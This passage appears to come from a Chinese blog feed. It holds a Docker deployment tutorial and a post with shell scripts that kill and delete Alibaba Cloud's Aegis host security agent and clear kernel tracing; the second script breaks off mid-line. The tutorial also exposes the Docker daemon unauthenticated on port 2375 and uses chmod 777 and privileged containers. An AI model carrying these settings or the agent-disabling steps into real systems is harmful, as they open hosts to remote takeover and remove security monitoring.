Ubuntu、Debian、Fedora）来说，只能通过删除某些工具（例如 ifconfig 和 netstat）将镜像体积控制在 100M 以下。而对于 Alpine 而言，什么都不用删除，镜像大小也就只有 5M 而已。</p><p><strong>Alpine 镜像的另一个优势是包管理工具的执行速度非常快</strong>，安装软件体验非常顺滑。诚然，在传统的虚拟机上不需要太关心软件包的安装速度，同一个包只需要装一次即可，无需不停重复安装。容器就不一样了，你可能会定期构建新镜像，也可能会在运行的容器中临时安装某些调试工具，如果软件包的安装速度很慢，会很快消磨掉我们的耐心。</p><p>上面说的这么多，但是alpine镜像还是有很多坑，所以推荐使用如下Debian基础镜像：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FROM debian:buster-slim</span><br></pre></td></tr></table></figure><h3 id="docker相关语法命令"><a href="#docker相关语法命令" class="headerlink" title="docker相关语法命令"></a>docker相关语法命令</h3><ul><li><ol><li>环境变量ENV 指令的格式如下：</li></ol></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ENV &lt;key&gt;=&lt;value&gt; ...</span><br></pre></td></tr></table></figure><p>ENV 指令还允许另一种语法 ENV <key> <value>，省略了中间的等号。例如：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ENV MY_VAR my-value</span><br></pre></td></tr></table></figure><p><strong>支持这种替代语法为了向后兼容，但由于上述原因不鼓励使用，可能会在将来的版本中删除</strong>。 所以推荐使用带加号的。</p><ul><li><ol start="2"><li><code>ENTRYPOINT</code>和<code>CMD</code>区别</li></ol></li></ul><p> 为容器指定默认执行命令。 有两种格式的配置， 分别是：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ENTRYPOINT [<span class="string">&quot;executable&quot;</span>, <span class="string">&quot;param1&quot;</span>, <span class="string">&quot;param2&quot;</span>] (<span class="built_in">exec</span> 格式, 推荐)</span><br><span class="line">ENTRYPOINT <span class="built_in">command</span> param1 param2 (shell 格式)</span><br></pre></td></tr></table></figure><p>注意：Note: The exec form is parsed as a JSON array, which means that you must use double-quotes (“) around words not single-quotes (‘). <strong>exec格式的会作为json格式解析，所以必需是双引号，而不是单引号。否则单引号会报错误：entrypoint file not found</strong></p><p>CMD命令当后面加上一个命令，比如 docker run -it [image] /bin/bash，CMD 会被忽略掉，命令 bash 将被执行：</p><p>ENTRYPOINT 看上去与 CMD 很像，它们都可以指定要执行的命令及其参数。不同的地方在于 <strong>ENTRYPOINT 不会被忽略，一定会被执行，即使运行 docker run 时指定了其他命令</strong>。docker run <strong>传入的参数会附加到 ENTRYPOINT 之后， 前提是使用了 exec 格式</strong> 。</p><p>所以CMD可以作为容器的默认执行命令，而ENTRYPOINT不可以替换默认的执行命令。</p><ul><li><ol start="3"><li><code>ADD</code>和<code>COPY</code>的区别</li></ol></li></ul><ol><li>add 和 copy 都是复制文件 / 文件夹</li><li>add 可以从网络 / 本地复制; copy 仅从本地复制, 语义更明确, 推荐使用 copy。</li></ol><p>COPY对于文件而言可以直接将文件复制到镜像中，代码如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">COPY $&#123;JAR_FILE&#125; /usr/local/oas/</span><br></pre></td></tr></table></figure><p>对于目录而言，该命令只复制目录中的内容而不包含目录自身，代码如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">COPY nickdir .</span><br><span class="line">WORKDIR /usr/local/oas/</span><br></pre></td></tr></table></figure><p>ADD命令相对于COPY命令，可以解压缩文件并把它们添加到镜像中的功能，如果我们有一个压缩文件包，并且需要把这个压缩包中的文件添加到镜像中。需不需要先解开压缩包然后执行 COPY 命令呢？当然不需要！我们可以通过 ADD 命令一次搞定：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ADD nickdir.tar.gz .</span><br><span class="line">WORKDIR /usr/local/oas/</span><br></pre></td></tr></table></figure><p>同时ADD还可以从 url 拷贝文件到镜像中，但官方不推荐这样使用，官方建议我们当需要从远程复制文件时，最好使用 curl 或 wget 命令来代替 ADD 命令。原因是，当使用 ADD 命令时，会创建更多的镜像层，当然镜像的 size 也会更大，代码如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ADD http://example.com/big.tar.xz /usr/src/things/</span><br><span class="line">RUN tar -xJf /usr/src/things/big.tar.xz -C /usr/src/things</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>所以ADD命令官方推荐只有在解压缩文件并把它们添加到镜像中时才需要。</p><p>其他情况推荐都使用COPY命令。</p><h2 id="1-nginx部署"><a href="#1-nginx部署" class="headerlink" title="1. nginx部署"></a>1. nginx部署</h2><p><strong>注意：推荐nginx不用docker部署，直接采用宿主机器安装。以下的安装方式不推荐</strong></p><p>参考安装步骤链接： <a href="https://www.digitalocean.com/community/tutorials/how-to-run-nginx-in-a-docker-container-on-ubuntu-14-04" target="_blank" rel="noopener">https://www.digitalocean.com/community/tutorials/how-to-run-nginx-in-a-docker-container-on-ubuntu-14-04</a></p><p>执行如下命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sudo docker pull nginx</span><br><span class="line"></span><br><span class="line">mkdir -p /opt/html</span><br><span class="line">cd /opt</span><br><span class="line"></span><br><span class="line">sudo docker run --name nginx -d -p 80:80 -v /etc/nginx:/etc/nginx -v $(pwd)/html:/usr/share/nginx/html nginx</span><br><span class="line"></span><br><span class="line">sudo docker run --name nginx -d -p 80:80 -v /etc/nginx:/etc/nginx -v $PWD/html:/usr/share/nginx/html nginx</span><br><span class="line"></span><br><span class="line">docker logs nginx</span><br></pre></td></tr></table></figure><h2 id="2-jenkins部署"><a href="#2-jenkins部署" class="headerlink" title="2. jenkins部署"></a>2. jenkins部署</h2><p>参考文档： <a href="https://developpaper.com/docker-installs-the-latest-version-of-jenkins/" target="_blank" rel="noopener">https://developpaper.com/docker-installs-the-latest-version-of-jenkins/</a></p><p>命令如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker pull jenkins/jenkins:lts</span><br><span class="line">docker images   # 查看对应的下载的jenkins镜像的jenkins版本</span><br><span class="line">docker inspect &lt;jenkins image id&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/alterhu2020/StorageHub/master/img/20210305170845.png" alt="20210305170845"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">Create data mount directory</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> mkdir /opt/jenkins_home</span></span><br><span class="line"><span class="meta">#</span><span class="bash">The data directory is authorized. Otherwise, an error is reported. There is no such file directory</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> chmod 777 /opt/jenkins_home/</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker run -d -p 8888:8080 -p 50000:50000 --privileged=true  -v /opt/jenkins_home:/var/jenkins_home --name jenkins  jenkins/jenkins:lts</span><br></pre></td></tr></table></figure><p>检查是否jenkins正常启动：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">View containers all containers</span></span><br><span class="line">docker ps -a</span><br><span class="line">​</span><br><span class="line"><span class="meta">#</span><span class="bash">View running containers</span></span><br><span class="line">docker ps</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>输入对应的ip地址和端口号即可访问对应的jenkins服务了，需要输入对应的初始化的管理员密码，密码是在容器里面的，使用下面的命令得到初始化的密码，或者直接在宿主机器加载的目录：<code>/opt/jenkins_home/</code>获取对应的信息：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">[image ID] the image ID of the container</span></span><br><span class="line">docker exec -it [IMAGE ID] bash</span><br><span class="line">​</span><br><span class="line"><span class="meta">#</span><span class="bash">Get the password by <span class="built_in">command</span></span></span><br><span class="line">cat /var/jenkins_home/secrets/initialAdminPassword</span><br></pre></td></tr></table></figure><p>安装完毕。</p><p>其他配置和插件安装参考：</p><h2 id="3-java应用程序部署"><a href="#3-java应用程序部署" class="headerlink" title="3. java应用程序部署"></a>3. java应用程序部署</h2><p>此处推荐的几个基础jdk镜像：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> jdk11</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> docker pull adoptopenjdk/openjdk11:jdk-11.0.10_9-slim</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> docker pull adoptopenjdk/openjdk11:jdk-11.0.10_9-debianslim</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> docker pull adoptopenjdk/openjdk11:jdk-11.0.10_9-debianslim-slim</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> jdk15</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> docker pull adoptopenjdk/openjdk15:jdk-15.0.2_7-slim</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> docker pull adoptopenjdk/openjdk15:jdk-15.0.2_7-debianslim</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> docker pull adoptopenjdk/openjdk15:jdk-15.0.2_7-debianslim-slim</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>推荐一个博客介绍的几种docker镜像大小的对比，<a href="https://technology.amis.nl/continuous-delivery/containers/the-size-of-docker-images-containing-openjdk-11-0-6/" target="_blank" rel="noopener">https://technology.amis.nl/continuous-delivery/containers/the-size-of-docker-images-containing-openjdk-11-0-6/</a><br>如下图所示：</p><p><img src="https://raw.githubusercontent.com/alterhu2020/StorageHub/master/img/20210305092831.png" alt="docker"></p><p><strong>如何退出jshell命令？答案：输入<code>/exit</code>命令</strong></p><p>3.1 配置springboot的一个安装包的<code>Dockerfile</code>脚本：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">FROM adoptopenjdk/openjdk11:jdk-11.0.10_9-slim</span><br><span class="line">WORKDIR /opt</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> entrypoint script</span></span><br><span class="line">COPY entrypoint.sh /opt/</span><br><span class="line">ENTRYPOINT [&quot;/opt/entrypoint.sh&quot;]</span><br></pre></td></tr></table></figure><h2 id="4-python应用程序部署"><a href="#4-python应用程序部署" class="headerlink" title="4. python应用程序部署"></a>4. python应用程序部署</h2><p>此处推荐的基础镜像是：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> python 3.10</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> docker pull python:3.10.0a6-slim</span></span><br></pre></td></tr></table></figure><h2 id="5-vue应用程序部署"><a href="#5-vue应用程序部署" class="headerlink" title="5. vue应用程序部署"></a>5. vue应用程序部署</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">FROM node:10</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Create app directory</span></span><br><span class="line">WORKDIR /app</span><br><span class="line">ADD . /app/</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> global install &amp; update</span></span><br><span class="line">RUN npm i -g npm &amp;&amp; npm i -g yarn</span><br><span class="line"></span><br><span class="line">RUN rm yarn.lock</span><br><span class="line">RUN yarn</span><br><span class="line">RUN yarn build</span><br><span class="line"></span><br><span class="line">ENV HOST 0.0.0.0</span><br><span class="line">EXPOSE 3000</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> start <span class="built_in">command</span></span></span><br><span class="line">CMD [ &quot;yarn&quot;, &quot;start&quot; ]</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="6-selenium测试环境部署"><a href="#6-selenium测试环境部署" class="headerlink" title="6. selenium测试环境部署"></a>6. selenium测试环境部署</h2><h2 id="docker启动报错"><a href="#docker启动报错" class="headerlink" title="docker启动报错"></a>docker启动报错</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">journalctl -fu docker.service</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="7-服务端如何开启docker的tcp通信？"><a href="#7-服务端如何开启docker的tcp通信？" class="headerlink" title="7. 服务端如何开启docker的tcp通信？"></a>7. 服务端如何开启docker的tcp通信？</h2><p>docker默认只提供本地unix，sock文件的连接方式，让docker能够监听tcp端口还需要进行一些配置。<br>1.1 首先编辑docker的宿主机文件<code>nano /lib/systemd/system/docker.service</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> <span class="comment">#ExecStart=/usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock</span></span></span><br><span class="line">ExecStart=/usr/bin/dockerd -H unix:///var/run/docker.sock -H tcp://0.0.0.0:2375</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>保存配置。</p><p>1.2 重新加载系统服务配置文件（包含刚刚修改的文件）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl daemon-reload</span><br></pre></td></tr></table></figure><p>重启docker服务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart docker</span><br></pre></td></tr></table></figure><p>1.3 防火墙添加开放2375端口</p><p>1.4 在Windows系统上测试端口是否可以使用:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://localhost:2375/version</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Docker安装配置&quot;&gt;&lt;a href=&quot;#Docker安装配置&quot; class=&quot;headerlink&quot; title=&quot;Docker安装配置&quot;&gt;&lt;/a&gt;Docker安装配置&lt;/h2&gt;&lt;p&gt;从现在开始所有的部署相关的都docker化，不再使用以前的人工部署方式。&lt;/</summary>
      
    
    
    
    <category term="运维部署" scheme="https://seniortesting.club/categories/%E8%BF%90%E7%BB%B4%E9%83%A8%E7%BD%B2/"/>
    
    <category term="容器" scheme="https://seniortesting.club/categories/%E8%BF%90%E7%BB%B4%E9%83%A8%E7%BD%B2/%E5%AE%B9%E5%99%A8/"/>
    
    
    <category term="python" scheme="https://seniortesting.club/tags/python/"/>
    
    <category term="vue" scheme="https://seniortesting.club/tags/vue/"/>
    
    <category term="java" scheme="https://seniortesting.club/tags/java/"/>
    
    <category term="selenium" scheme="https://seniortesting.club/tags/selenium/"/>
    
  </entry>
  
  <entry>
    <title>如何卸载阿里云的watchdog等内置服务</title>
    <link href="https://seniortesting.club/posts/PaMaO9L6Qn/"/>
    <id>https://seniortesting.club/posts/PaMaO9L6Qn/</id>
    <published>2021-03-25T15:16:38.000Z</published>
    <updated>2021-04-18T13:00:39.467Z</updated>
    
    <content type="html"><![CDATA[<h2 id="卸载阿里云背后脚本"><a href="#卸载阿里云背后脚本" class="headerlink" title="卸载阿里云背后脚本"></a>卸载阿里云背后脚本</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">check linux Gentoo os</span> </span><br><span class="line">var=`lsb_release -a | grep Gentoo`</span><br><span class="line">if [ -z &quot;$&#123;var&#125;&quot; ]; then </span><br><span class="line"> var=`cat /etc/issue | grep Gentoo`</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">if [ -d &quot;/etc/runlevels/default&quot; -a -n &quot;$&#123;var&#125;&quot; ]; then</span><br><span class="line"> LINUX_RELEASE=&quot;GENTOO&quot;</span><br><span class="line">else</span><br><span class="line"> LINUX_RELEASE=&quot;OTHER&quot;</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">stop_aegis()&#123;</span><br><span class="line"> killall -9 aegis_cli &gt;/dev/null 2&gt;&amp;1</span><br><span class="line"> killall -9 aegis_update &gt;/dev/null 2&gt;&amp;1</span><br><span class="line"> killall -9 AliYunDun &gt;/dev/null 2&gt;&amp;1</span><br><span class="line"> killall -9 AliHids &gt;/dev/null 2&gt;&amp;1</span><br><span class="line"> killall -9 AliHips &gt;/dev/null 2&gt;&amp;1</span><br><span class="line"> killall -9 AliYunDunUpdate &gt;/dev/null 2&gt;&amp;1</span><br><span class="line">    </span><br><span class="line">    if [ -d /usr/local/aegis/aegis_debug ];then</span><br><span class="line">        if [ -d /usr/local/aegis/aegis_debug/tracing/instances/aegis ];then</span><br><span class="line">            echo &gt; /usr/local/aegis/aegis_debug/tracing/instances/aegis/set_event</span><br><span class="line">        else</span><br><span class="line">            echo &gt; /usr/local/aegis/aegis_debug/tracing/set_event</span><br><span class="line">        fi</span><br><span class="line">    fi</span><br><span class="line">    </span><br><span class="line">    if [ -d /sys/kernel/debug ];then</span><br><span class="line">        if [ -d /sys/kernel/debug/tracing/instances/aegis ];then</span><br><span class="line">            echo &gt; /sys/kernel/debug/tracing/instances/aegis/set_event</span><br><span class="line">        else</span><br><span class="line">            echo &gt; /sys/kernel/debug/tracing/set_event</span><br><span class="line">        fi</span><br><span class="line">    fi</span><br><span class="line">    </span><br><span class="line">    printf &quot;%-40s %40s\n&quot; &quot;Stopping aegis&quot; &quot;[  OK  ]&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">remove_aegis()&#123;</span><br><span class="line">if [ -d /usr/local/aegis ];then</span><br><span class="line">    rm -rf /usr/local/aegis/aegis_client</span><br><span class="line">    rm -rf /usr/local/aegis/aegis_update</span><br><span class="line"> rm -rf /usr/local/aegis/alihids</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">if [ -d /usr/local/aegis/aegis_debug ];then</span><br><span class="line">    umount /usr/local/aegis/aegis_debug</span><br><span class="line">    rm -rf /usr/local/aegis/aegis_debug</span><br><span class="line">fi</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">uninstall_service() &#123;</span><br><span class="line">   </span><br><span class="line">   if [ -f &quot;/etc/init.d/aegis&quot; ]; then</span><br><span class="line">  /etc/init.d/aegis stop  &gt;/dev/null 2&gt;&amp;1</span><br><span class="line">  rm -f /etc/init.d/aegis </span><br><span class="line">   fi</span><br><span class="line"></span><br><span class="line"> if [ $LINUX_RELEASE = &quot;GENTOO&quot; ]; then</span><br><span class="line">  rc-update del aegis default 2&gt;/dev/null</span><br><span class="line">  if [ -f &quot;/etc/runlevels/default/aegis&quot; ]; then</span><br><span class="line">   rm -f &quot;/etc/runlevels/default/aegis&quot; &gt;/dev/null 2&gt;&amp;1;</span><br><span class="line">  fi</span><br><span class="line">    elif [ -f /etc/init.d/aegis ]; then</span><br><span class="line">         /etc/init.d/aegis  uninstall</span><br><span class="line">     for ((var=2; var&lt;=5; var++)) do</span><br><span class="line">   if [ -d &quot;/etc/rc$&#123;var&#125;.d/&quot; ];then</span><br><span class="line">     rm -f &quot;/etc/rc$&#123;var&#125;.d/S80aegis&quot;</span><br><span class="line">      elif [ -d &quot;/etc/rc.d/rc$&#123;var&#125;.d&quot; ];then</span><br><span class="line">    rm -f &quot;/etc/rc.d/rc$&#123;var&#125;.d/S80aegis&quot;</span><br><span class="line">   fi</span><br><span class="line">  done</span><br><span class="line">    fi</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">stop_aegis</span><br><span class="line">uninstall_service</span><br><span class="line">remove_aegis</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">printf &quot;%-40s %40s\n&quot; &quot;Uninstalling aegis&quot;  &quot;[  OK  ]&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="卸载阿里云定时任务"><a href="#卸载阿里云定时任务" class="headerlink" title="卸载阿里云定时任务"></a>卸载阿里云定时任务</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line"></span><br><span class="line">#check linux Gentoo os </span><br><span class="line">var&#x3D;&#96;lsb_release -a | grep Gentoo&#96;</span><br><span class="line">if [ -z &quot;$&#123;var&#125;&quot; ]; then </span><br><span class="line"> var&#x3D;&#96;cat &#x2F;etc&#x2F;issue | grep Gentoo&#96;</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">if [ -d &quot;&#x2F;etc&#x2F;runlevels&#x2F;default&quot; -a -n &quot;$&#123;var&#125;&quot; ]; then</span><br><span class="line"> LINUX_RELEASE&#x3D;&quot;GENTOO&quot;</span><br><span class="line">else</span><br><span class="line"> LINUX_RELEASE&#x3D;&quot;OTHER&quot;</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">stop_aegis()&#123;</span><br><span class="line"> killall -9 aegis_cli &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1</span><br><span class="line"> killall -9 aegis_update &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1</span><br><span class="line"> killall -9 aegis_cli &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1</span><br><span class="line">    printf &quot;%-40s %40s\n&quot; &quot;Stopping aegis&quot; &quot;[  OK  ]&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">stop_quartz()&#123;</span><br><span class="line"> killall -9 aegis_quartz &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1</span><br><span class="line">        printf &quot;%-40s %40s\n&quot; &quot;Stopping quartz&quot; &quot;[  OK  ]&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">remove_aegis()&#123;</span><br><span class="line">if [ -d &#x2F;usr&#x2F;local&#x2F;aegis ];then</span><br><span class="line">    rm -rf &#x2F;usr&#x2F;local&#x2F;aegis&#x2F;aegis_client</span><br><span class="line">    rm -rf &#x2F;usr&#x2F;local&#x2F;aegis&#x2F;aegis_update</span><br><span class="line">fi</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">remove_quartz()&#123;</span><br><span class="line">if [ -d &#x2F;usr&#x2F;local&#x2F;aegis ];then</span><br><span class="line"> rm -rf &#x2F;usr&#x2F;local&#x2F;aegis&#x2F;aegis_quartz</span><br><span class="line">fi</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">uninstall_service() &#123;</span><br><span class="line">   </span><br><span class="line">   if [ -f &quot;&#x2F;etc&#x2F;init.d&#x2F;aegis&quot; ]; then</span><br><span class="line">  &#x2F;etc&#x2F;init.d&#x2F;aegis stop  &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1</span><br><span class="line">  rm -f &#x2F;etc&#x2F;init.d&#x2F;aegis </span><br><span class="line">   fi</span><br><span class="line"></span><br><span class="line"> if [ $LINUX_RELEASE &#x3D; &quot;GENTOO&quot; ]; then</span><br><span class="line">  rc-update del aegis default 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line">  if [ -f &quot;&#x2F;etc&#x2F;runlevels&#x2F;default&#x2F;aegis&quot; ]; then</span><br><span class="line">   rm -f &quot;&#x2F;etc&#x2F;runlevels&#x2F;default&#x2F;aegis&quot; &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1;</span><br><span class="line">  fi</span><br><span class="line">    elif [ -f &#x2F;etc&#x2F;init.d&#x2F;aegis ]; then</span><br><span class="line">         &#x2F;etc&#x2F;init.d&#x2F;aegis  uninstall</span><br><span class="line">     for ((var&#x3D;2; var&lt;&#x3D;5; var++)) do</span><br><span class="line">   if [ -d &quot;&#x2F;etc&#x2F;rc$&#123;var&#125;.d&#x2F;&quot; ];then</span><br><span class="line">     rm -f &quot;&#x2F;etc&#x2F;rc$&#123;var&#125;.d&#x2F;S80aegis&quot;</span><br><span class="line">      elif [ -d &quot;&#x2F;etc&#x2F;rc.d&#x2F;rc$&#123;var&#125;.d&quot; ];then</span><br><span class="line">    rm -f 